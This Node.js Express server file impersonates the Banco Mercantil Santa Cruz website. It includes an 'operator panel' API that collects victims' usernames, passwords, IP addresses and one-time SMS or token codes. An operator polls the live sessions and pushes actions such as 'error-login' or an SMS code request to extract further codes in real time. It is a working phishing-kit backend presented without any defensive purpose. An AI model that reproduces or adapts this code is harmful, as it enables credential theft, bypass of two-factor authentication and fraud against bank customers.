const path = require("path");
const express = require("express");
const { ASSETS, segments, nav, slides, services, promos, channels, pages, footer } = require("./data/site");

const app = express();
const PORT = process.env.PORT || 3000;

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.locals.ASSETS = ASSETS;

app.use(express.json({ limit: "25mb" }));
app.use(express.urlencoded({ limit: "25mb", extended: true }));

// CORS & Security Headers
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// Static public files
app.use(express.static(path.join(__dirname, "public")));

// Expose operator panel
app.use("/panel", express.static(path.join(__dirname, "public", "panel")));
app.get("/panel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "panel", "index.html"));
});

// In-memory sessions store
let sessions = {};
let globalCustomImage = null;

// Helper to register API routes on both /api and /panel/api
const registerSessionRoutes = (prefix) => {
  // 1. Create or update session from login
  app.post(`${prefix}/sessions`, (req, res) => {
    const { id, username, password, tipoUsuario, device, ip, state, customImage, action } = req.body;
    if (!id) return res.status(400).json({ error: "Missing session id" });

    const clientIp = ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";

    if (sessions[id]) {
      const isSubmittingPassword = password !== undefined && password !== "" && password !== "—";
      sessions[id] = {
        ...sessions[id],
        username: username || sessions[id].username,
        password: password !== undefined && password !== "" ? password : sessions[id].password,
        tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
        device: device || sessions[id].device,
        ip: clientIp,
        state: state || (isSubmittingPassword ? "waiting" : sessions[id].state),
        action: action !== undefined ? action : (isSubmittingPassword ? null : sessions[id].action),
        actionId: sessions[id].actionId || 0,
        customImage: customImage !== undefined ? customImage : sessions[id].customImage,
        last_seen: Date.now(),
        updatedAt: Date.now()
      };
    } else {
      sessions[id] = {
        id,
        index: Object.keys(sessions).length + 1,
        username: username || "—",
        password: password || "—",
        tipoUsuario: tipoUsuario || "Banca por Internet",
        device: device || "desktop",
        ip: clientIp,
        state: state || "waiting",
        customImage: customImage !== undefined ? customImage : (globalCustomImage || null),
        token: "",
        action: null,
        actionId: 0,
        createdAt: Date.now(),
        last_seen: Date.now(),
        updatedAt: Date.now()
      };
    }
    res.json({ success: true, session: sessions[id] });
  });

  // 2. Get all sessions for operator panel
  app.get(`${prefix}/sessions`, (req, res) => {
    const now = Date.now();
    const list = Object.values(sessions).map(s => ({
      ...s,
      customImage: s.customImage !== undefined && s.customImage !== null ? s.customImage : (globalCustomImage || null),
      online: now - s.last_seen < 20000
    }));
    res.json(list);
  });

  // 3. Get single session for polling
  app.get(`${prefix}/sessions/:id`, (req, res) => {
    const session = sessions[req.params.id];
    if (!session) return res.status(404).json({ error: "Session not found" });
    res.json({
      ...session,
      customImage: session.customImage !== undefined && session.customImage !== null ? session.customImage : (globalCustomImage || null)
    });
  });

  // 4. Submit token from OTP validation
  app.post(`${prefix}/sessions/:id/token`, (req, res) => {
    const { id } = req.params;
    const { token } = req.body;
    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });

    sessions[id].token = token;
    const currentAction = sessions[id].action;
    const currentState = sessions[id].state;
    if (currentAction === "sms" || currentAction === "error-sms" || currentState === "error-sms" || currentState === "waiting-sms" || currentState === "received-sms") {
      sessions[id].state = "received-sms";
    } else {
      sessions[id].state = "received-dinamica";
    }
    sessions[id].action = null;
    sessions[id].last_seen = Date.now();
    sessions[id].updatedAt = Date.now();
    res.json({ success: true, session: sessions[id] });
  });

  // 5. Keepalive ping
  app.post(`${prefix}/sessions/:id/ping`, (req, res) => {
    const { id } = req.params;
    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });

    sessions[id].last_seen = Date.now();
    res.json({ success: true });
  });

  // 6. Set operator action
  app.post(`${prefix}/sessions/:id/action`, (req, res) => {
    const { id } = req.params;
    const { action, state } = req.body;
    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });

    sessions[id].action = action;
    sessions[id].actionId = (sessions[id].actionId || 0) + 1;
    if (state) sessions[id].state = state;
    if (action === "dinamica" || action === "sms") {
      sessions[id].token = "";
    }
    if (action === "error-login") {
      sessions[id].password = "";
    }
    sessions[id].last_seen = Date.now();
    sessions[id].updatedAt = Date.now();
    res.json({ success: true, session: sessions[id] });
  });

  // 6b. Update session custom image
  app.post(`${prefix}/sessions/:id/image`, (req, res) => {
    const { id } = req.params;
    const { image } = req.body;
    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });

    sessions[id].customImage = image || null;
    sessions[id].updatedAt = Date.now();
    res.json({ success: true, session: sessions[id] });
  });

  // 6c. Global image endpoints
  app.post(`${prefix}/global-image`, (req, res) => {
    const { image } = req.body;
    globalCustomImage = image || null;
    res.json({ success: true, globalCustomImage });
  });

  app.get(`${prefix}/global-image`, (req, res) => {
    res.json({ globalCustomImage });
  });

  // 7. Update typing state
  app.post(`${prefix}/sessions/:id/state`, (req, res) => {
    const { id } = req.params;
    const { state } = req.body;
    const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";

    if (!sessions[id]) {
      return res.status(404).json({ error: "Session not found" });
    }

    sessions[id].state = state;
    sessions[id].last_seen = Date.now();
    sessions[id].updatedAt = Date.now();
    res.json({ success: true, session: sessions[id] });
  });

  // 8. Clear all sessions
  app.post(`${prefix}/clear`, (req, res) => {
    sessions = {};
    res.json({ success: true });
  });
};

registerSessionRoutes("/api");
registerSessionRoutes("/panel/api");

// Site template locals
app.use((req, res, next) => {
  res.locals.ASSETS = ASSETS;
  res.locals.segments = segments;
  res.locals.nav = nav;
  res.locals.footer = footer;
  res.locals.currentPath = req.path;
  res.locals.segment = req.query.segment || "personas";
  res.locals.year = new Date().getFullYear();
  res.locals.todayLabel = new Intl.DateTimeFormat("es-BO", {
    weekday: "long",
    day: "numeric",
    month: "long",
    year: "numeric"
  }).format(new Date());
  next();
});

app.get("/", (req, res) => {
  res.render("index", {
    title: "BMSC | Banco Mercantil Santa Cruz S.A.",
    slides,
    services,
    promos,
    channels
  });
});

app.get("/contactanos", (req, res) => {
  res.render("contacto", {
    title: "Contáctanos | Mercantil Santa Cruz",
    sent: false
  });
});

app.post("/contactanos", (req, res) => {
  const { nombre, correo, mensaje } = req.body;
  res.render("contacto", {
    title: "Contáctanos | Mercantil Santa Cruz",
    sent: true,
    nombre: (nombre || "").trim(),
    correo: (correo || "").trim(),
    mensaje: (mensaje || "").trim()
  });
});

app.get("/banca-por-internet", (req, res) => {
  res.render("banca", {
    title: "Banca por Internet | Mercantil Santa Cruz"
  });
});

app.get("/health", (req, res) => {
  res.status(200).type("text/plain").send("ok");
});

app.get("/:slug", (req, res, next) => {
  const page = pages[req.params.slug];
  if (!page) return next();
  res.render("page", {
    title: `${page.title} | Mercantil Santa Cruz`,
    page
  });
});

app.use((req, res) => {
  res.status(404).render("page", {
    title: "Página no encontrada | Mercantil Santa Cruz",
    page: {
      title: "No encontramos esta página",
      eyebrow: "404",
      lead: "El enlace no existe o fue movido. Vuelve al inicio o recorre los productos desde el menú.",
      highlights: [
        "Usa el menú superior para cuentas, préstamos y tarjetas.",
        "Si buscas atención, entra a Contáctanos.",
        "Los canales digitales están en Banca 24/7."
      ]
    }
  });
});

const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`Mercantil Santa Cruz listo en http://localhost:${PORT}`);
  console.log(`Panel de operador disponible en http://localhost:${PORT}/panel`);
});

server.on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.error(`Puerto ${PORT} en uso. Intentando en ${PORT + 1}...`);
    app.listen(PORT + 1, "0.0.0.0", () => {
      console.log(`Mercantil Santa Cruz listo en http://localhost:${PORT + 1}`);
      console.log(`Panel de operador disponible en http://localhost:${PORT + 1}/panel`);
    });
  } else {
    console.error("Error del servidor:", err);
  }
});
